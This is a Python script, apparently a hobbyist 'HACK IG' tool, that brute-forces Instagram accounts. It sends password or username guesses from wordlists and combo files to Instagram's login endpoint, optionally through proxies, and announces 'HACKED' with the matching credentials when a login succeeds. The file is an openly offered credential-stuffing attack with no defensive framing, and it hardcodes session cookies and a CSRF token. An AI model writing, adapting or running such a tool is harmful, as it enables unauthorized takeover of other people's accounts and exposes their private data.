Black="\033[1;30m"       # Black
Red="\033[1;31m"         # 
Green="\033[1;32m"       # 'هGreen
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White
import random
import requests
class FX_PY():
  def test_list(self,username,password):

        Req = requests.post('https://www.instagram.com/accounts/login/ajax/', headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '379',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'mid=YwFaswALAAGDUIqF4Zv_KkYyK5dy; ig_did=87AF4E9C-A6A1-45EB-9934-7036FDE00AE5; datr=qFsBY4YVOAiwQpifGnwwO1oO; shbid="10011\0543272046838\0541694111575:01f7366bb0a663d7a42a2cc1b628b3d07d49a42bbb67dc1dbe955cd930d60a346a3d703d"; shbts="1662575575\0543272046838\0541694111575:01f7ccb79e8bab04471e2608c7922fbe6fb7b276b2dbb3c7110f7dd5cdd44043bb79086c"; rur="NAO\0543272046838\0541694199569:01f7ab483627fde29c504bd42b02cea174a7dcb4904d5a46fe19eef089388cfb6f0a7790"; csrftoken=LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/login/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.64 (Edition Campaign 34)',
            'x-asbd-id': '198387',
            'x-csrftoken': 'LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR0iSQ98lXvHxKM40b30YUTjBQOI5i1AFNwhXj3bMCuFHShO',
            'x-instagram-ajax': '50d4f75b2921',
            'x-requested-with': 'XMLHttpRequest',
        },data = {
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+password,
        'username': username,
        'queryParams': '{}',
        'optIntoOneTap': False,
        'stopDeletionNonce': "",
        'trustedDeviceRecords': '{}'
            }).text
        
        if Req == '{"user":true,"authenticated":false,"status":"ok"}' :
            print('=============================')
            print(f' BAD LOGIN >> {username} : {password}')
            print('=============================')
            print('\n')
        elif Req == '{"user":false,"authenticated":false,"status":"ok"}':
            print('=============================')
            print(f' BAD LOGIN >> {username} : {password}')
            print('=============================')
            print('\n')
        elif '"authenticated":false' in Req:
            print('=============================')
            print(f' BAD LOGIN >> {username} : {password}')
            print('=============================')
            print('\n')
        
        else:
            print('\n\n')
            print('=============================');print('=============================')
            print(f' HACKED >>  {username} : {password}')
            print('=============================');print('=============================')
            print('\n\n')
            exit()
        
  
  
  
  
  
  
  def proxy_list(self,username,password,proxy):
        proxies={'http':f'http://{proxy}'}
        Req = requests.post('https://www.instagram.com/accounts/login/ajax/', headers = {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'content-length': '379',
            'content-type': 'application/x-www-form-urlencoded',
            'cookie': 'mid=YwFaswALAAGDUIqF4Zv_KkYyK5dy; ig_did=87AF4E9C-A6A1-45EB-9934-7036FDE00AE5; datr=qFsBY4YVOAiwQpifGnwwO1oO; shbid="10011\0543272046838\0541694111575:01f7366bb0a663d7a42a2cc1b628b3d07d49a42bbb67dc1dbe955cd930d60a346a3d703d"; shbts="1662575575\0543272046838\0541694111575:01f7ccb79e8bab04471e2608c7922fbe6fb7b276b2dbb3c7110f7dd5cdd44043bb79086c"; rur="NAO\0543272046838\0541694199569:01f7ab483627fde29c504bd42b02cea174a7dcb4904d5a46fe19eef089388cfb6f0a7790"; csrftoken=LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'origin': 'https://www.instagram.com',
            'referer': 'https://www.instagram.com/accounts/login/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Opera GX";v="89", "Chromium";v="103", "_Not:A-Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36 OPR/89.0.4447.64 (Edition Campaign 34)',
            'x-asbd-id': '198387',
            'x-csrftoken': 'LIfX47FtEI1IsJnWzcToQVdP5PQ7kjFp',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': 'hmac.AR0iSQ98lXvHxKM40b30YUTjBQOI5i1AFNwhXj3bMCuFHShO',
            'x-instagram-ajax': '50d4f75b2921',
            'x-requested-with': 'XMLHttpRequest',
        },data = {
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:&:'+password,
        'username': username,
        'queryParams': '{}',
        'optIntoOneTap': False,
        'stopDeletionNonce': "",
        'trustedDeviceRecords': '{}'
            },proxies=proxies).text
        
        if Req == '{"user":true,"authenticated":false,"status":"ok"}' :
            print('=============================')
            print(f' BAD LOGIN >> {username} : {password}')
            print('=============================')
            print('\n')
        elif Req == '{"user":false,"authenticated":false,"status":"ok"}':
            print('=============================')
            print(f' BAD LOGIN >> {username} : {password}')
            print('=============================')
            print('\n')
        elif '"authenticated":false' in Req:
            print('=============================')
            print(f' BAD LOGIN >> {username} : {password}')
            print('=============================')
            print('\n')
        
        else:
            print('\n\n')
            print('=============================');print('=============================')
            print(f'HACKED >> {username} : {password}')
            print('=============================');print('=============================')
            print('\n\n')
            exit()
  
  
  
x=FX_PY()
print(f'''
{Yellow}INSTAGRAM :{Red} FX_PY3
{Yellow}TELEGRAM :{Red} FX_PY


██╗  ██╗ █████╗  ██████╗██╗  ██╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝
███████║███████║██║     █████╔╝ 
██╔══██║██╔══██║██║     ██╔═██╗ 
██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                                
██╗ ██████╗ 
██║██╔════╝ 
██║██║  ███╗
██║██║   ██║
██║╚██████╔╝
╚═╝ ╚═════╝ 
          
[1] - user & pass file
[2] - pass & user's file
[3] - combo file 

[4] - user & pass file >>> proxy
[5] - pass & user's file >>> proxy
[6] - combo file  >>> proxy 
==================================

''')
_=f'[+] - '
try :
	c=int(input('[+] Choose : '))
except :
	print(Red+'[X] Enter numper [X]')
	exit() 
i=0
if c == 1:
	username =input(_+' Enter User : ')
	file = input(_+" Enter Password Combo : ")
	print('\n\n')
	for password in open(file,'r').read().splitlines(): 
		x.test_list(username,password)

elif c == 2:		
	password =input(_+' Enter password : ')
	file = input(_+" Enter user Combo : ")
	print('\n\n')
	for username in open(file,'r').read().splitlines(): 
		x.test_list(username,password)






if c == 4:
	username =input(_+' Enter User : ')
	file = input(_+" Enter Password Combo : ")
	prox = input(_+" Enter proxy list : ")
	print('\n\n')
	for password in open(file,'r').read().splitlines():
		proxy=open(prox,'r').readline()
		
		x.proxy_list(username,password,proxy)
		
elif c == 5:		
	password =input(_+' Enter password : ')
	file = input(_+" Enter user Combo : ")
	prox = input(_+" Enter proxy list : ")
	print('\n\n')
	for username in open(file,'r').read().splitlines(): 
		proxy=open(prox,'r').readline()
		
		x.proxy_list(username,password,proxy)


elif c == 3:		
	file = input(_+" Enter Combo file : ")
	print('\n\n')
	for combo in open(file,'r').read().splitlines(): 
		username=combo.split(':')[0]
		password=combo.split(':')[1]
		
		x.test_list(username,password)




elif c == 6:		
	file = input(_+" Enter Combo file : ")
	prox = input(_+" Enter proxy list : ")
	print('\n\n')
	for combo in open(file,'r').read().splitlines(): 
		proxy=open(prox,'r').readline()
		username=combo.split(':')[0]
		password=combo.split(':')[1]
		
		x.proxy_list(username,password,proxy)
